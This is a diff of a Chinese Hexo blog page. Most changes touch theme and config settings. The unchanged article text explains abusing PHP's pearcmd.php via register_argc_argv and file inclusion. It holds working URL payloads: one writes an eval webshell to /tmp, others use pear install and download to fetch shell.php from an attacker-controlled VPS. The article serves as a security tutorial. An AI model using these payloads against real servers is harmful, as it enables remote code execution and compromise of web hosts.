@@ -20,10 +20,20 @@ apt-get install php-pear
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="format-detection" content="telephone=no">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-BYTY196ENH');
+    </script>
 
 
     <title>浅析pearcmd.php漏洞 | hybcx&#39;s blog</title>
@@ -269,7 +279,7 @@ apt-get install php-pear
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -326,7 +336,7 @@ apt-get install php-pear
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -425,11 +435,6 @@ apt-get install php-pear
                 
 
                 
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
             </div>
         </div>
         <hr class="clearfix">
@@ -558,7 +563,7 @@ Type "pear help &lt;command&gt;" to get the help for the specified command.<span
 <blockquote>
 <p>不需要开启php.ini，即可通过$_SERVER[‘argv’]获取命令行参数，和cmd一样</p>
 </blockquote>
-<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112143311269.png" alt="image-20231112143311269"></p>
+<p><img src="image-20231112143311269.png" alt="image-20231112143311269"></p>
 <ul>
 <li>web模式</li>
 </ul>
@@ -567,8 +572,8 @@ Type "pear help &lt;command&gt;" to get the help for the specified command.<span
 这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]
 cli模式下的argv在web模式下不适用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>该变量是对queryString以+号进行切割，而不是&amp;</strong></p>
-<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112143957125.png" alt="image-20231112143957125"></p>
-<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112150040595.png" alt="image-20231112150040595"></p>
+<p><img src="image-20231112143957125.png" alt="image-20231112143957125"></p>
+<p><img src="image-20231112150040595.png" alt="image-20231112150040595"></p>
 <h2 id="2-3-register-argc-argv和pear的联系">2.3 register_argc_argv和pear的联系</h2>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
 
@@ -623,16 +628,16 @@ cli模式下的argv在web模式下不适用<span aria-hidden="true" class="line-
 <p>可以直接往web目录写入webshell，也可以往/tmp/目录写入任意文件名任意内容，然后通过文件包含去包含，在docker环境中pcel/pear都会被默认安装，安装的路径在/usr/local/lib/php（但不同系统的路径可能不同）</p>
 <p>尝试一下使用以下这个命令看下效果</p>
 <pre class="line-numbers language-none"><code class="language-none">pear config-create /114514whatever /tmp/test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112123753250.png" alt="image-20231112123753250"></p>
+<p><img src="image-20231112123753250.png" alt="image-20231112123753250"></p>
 <p>不过这里疑惑为何test.txt文件内容是这样的，在阅读了上述p神的文章发现，这里估计是在执行第一个参数后所产生的结果被序列化存储了（估计是session文件）之后被我们的命令行放入到了test.txt文件中而已。</p>
 <p>那根据上面我们知道第一个参数的内容会被写入文件，如果我们将第一个参数换成文件内容的话我们就可以写入可包含的文件了</p>
 <p>payload：</p>
 <pre class="line-numbers language-http" data-language="http"><code class="language-http">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST['cmd']);?&gt;+/tmp/test.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112130017310.png" alt="image-20231112130017310"></p>
+<p><img src="image-20231112130017310.png" alt="image-20231112130017310"></p>
 <p>蚁剑连接看看，如下图成功链接</p>
-<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112130139760.png" alt="image-20231112130139760"></p>
+<p><img src="image-20231112130139760.png" alt="image-20231112130139760"></p>
 <p>我们来看下写入的文件</p>
-<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112130213160.png" alt="image-20231112130213160"></p>
+<p><img src="image-20231112130213160.png" alt="image-20231112130213160"></p>
 <p>可以看见<code>/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST['cmd']);?&gt;</code>整个被作为参数传入了命令行，但是get参数</p>
 <p>file被正常解析了，这是因为前面说过的即使URL中存在等号，问号后的内容一样会被传入<code>$_SERVER['argv']</code></p>
 <h2 id="3-2-install">3.2 install</h2>
@@ -644,28 +649,28 @@ cli模式下的argv在web模式下不适用<span aria-hidden="true" class="line-
 <p>然后通过pear下载</p>
 <pre class="line-numbers language-none"><code class="language-none">pear install http://[vps]:[port]/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>结果：</p>
-<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112130636679.png" alt="image-20231112130636679"></p>
+<p><img src="image-20231112130636679.png" alt="image-20231112130636679"></p>
 <p>可以看到成功下载</p>
 <p>结果在<code>/tmp/pear/download/</code>目录下有一个<code>flag.php</code></p>
-<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112130729308.png" alt="image-20231112130729308"></p>
+<p><img src="image-20231112130729308.png" alt="image-20231112130729308"></p>
 <p>然后<code>install</code>有<code>--installroot</code>这个选项可以指定他的安装目录，这里可以构造payload远程下载我们的文件了</p>
 <pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//localhost:3354/?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://[vps]:[port]/flag.php</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112131028791.png" alt="image-20231112131028791"></p>
+<p><img src="image-20231112131028791.png" alt="image-20231112131028791"></p>
 <p>如上图成功包含</p>
 <h2 id="3-3-download">3.3 download</h2>
 <p>先查看一下download的用法</p>
 <pre class="line-numbers language-none"><code class="language-none">pear download [option] [package]
 #这里的option只有一个-Z, --nocompress，下载一个未压缩的tar包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>尝试一下下恶意的php文件</p>
-<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112140738636.png" alt="image-20231112140738636"></p>
+<p><img src="image-20231112140738636.png" alt="image-20231112140738636"></p>
 <p>虽然提示下载错误，但是在当前目录下直接留下了恶意文件。</p>
 <p>我们可以尝试一下利用这个<code>download</code></p>
 <p>我构造的payload为</p>
 <pre class="line-numbers language-none"><code class="language-none">?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://vps/shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112142255239.png" alt="image-20231112142255239"></p>
+<p><img src="image-20231112142255239.png" alt="image-20231112142255239"></p>
 <p>然后直接访问<code>shell</code>，成功</p>
 <pre class="line-numbers language-none"><code class="language-none">?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://vps/shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/image-20231112142330730.png" alt="image-20231112142330730"></p>
+<p><img src="image-20231112142330730.png" alt="image-20231112142330730"></p>
 <h1>0x04 过滤percmd</h1>
 <p>如果pearcmd关键词被ban怎么半，其实可以用peclcmd.php来代替，在这个php文件当中其实就是引入了pearcmd.php</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'/www/server/php/52/lib/php'</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'@'</span><span class="token operator">.</span><span class="token string single-quoted-string">'include_path'</span><span class="token operator">.</span><span class="token string single-quoted-string">'@'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
@@ -778,7 +783,7 @@ cli模式下的argv在web模式下不适用<span aria-hidden="true" class="line-
     <div id="rewardModal" class="modal">
         <div class="modal-content">
             <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <h4 class="reward-title">随缘，看各位佬的心情</h4>
             <div class="reward-content">
                 <div class="reward-tabs">
                     <ul class="tabs row">
@@ -786,7 +791,7 @@ cli模式下的argv在web模式下不适用<span aria-hidden="true" class="line-
                         <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                     </ul>
                     <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
                         <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
@@ -1066,12 +1071,12 @@ cli模式下的argv在web模式下不适用<span aria-hidden="true" class="line-
 <script>
     new Valine({
         el: '#vcomments',
-        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
-        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
-        serverURLs: '',
+        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
+        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
+        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
         notify: 'false' === 'true',
         verify: 'false' === 'true',
-        visitor: 'true' === 'true',
+        visitor: 'false' === 'true',
         avatar: 'mm',
         pageSize: '10',
         lang: 'zh-cn',
@@ -1208,6 +1213,8 @@ cli模式下的argv在web模式下不适用<span aria-hidden="true" class="line-
 
 <!-- 代码块收缩 -->
 
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
 
 
     </div>
@@ -1235,8 +1242,8 @@ cli模式下的argv在web模式下不适用<span aria-hidden="true" class="line-
             tocSelector: '#toc-content',
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            collapseDepth: Number('3'),
+            headingSelector: 'h2, h3, h4, h5, h6'
         });
 
         // Set scroll toc fixed.
@@ -1319,8 +1326,6 @@ cli模式下的argv在web模式下不适用<span aria-hidden="true" class="line-
             
             
             
-                
-            
             
                 <span id="busuanzi_container_site_pv">
                 &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
@@ -1340,24 +1345,28 @@ cli模式下的argv在web模式下不适用<span aria-hidden="true" class="line-
             <br>
             
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
+        <i class="fab fa-facebook-f"></i>
     </a>
 
 
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
         <i class="fab fa-qq"></i>
     </a>
 
@@ -1569,8 +1578,6 @@ $(function () {
     
     <script src="/libs/others/clicklove.js" async="async"></script>
     
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
     
 
     
